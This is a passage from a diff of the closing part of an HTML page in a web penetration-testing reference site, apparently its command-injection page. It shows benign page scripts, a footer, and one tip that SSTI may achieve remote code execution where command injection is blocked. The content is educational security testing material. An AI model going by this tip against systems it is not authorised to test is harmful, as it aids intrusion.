+        <span class="sa-why">Both achieve RCE. If CMDi is blocked, try SSTI in the same endpoint  · they often coexist in interpreted apps.</span>
+      </a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+// Copy buttons
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+
+// Active sidebar nav on scroll
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+
+// Checklist persistence
+const STORAGE_KEY = 'cmdi-checklist-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length/all.length*100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
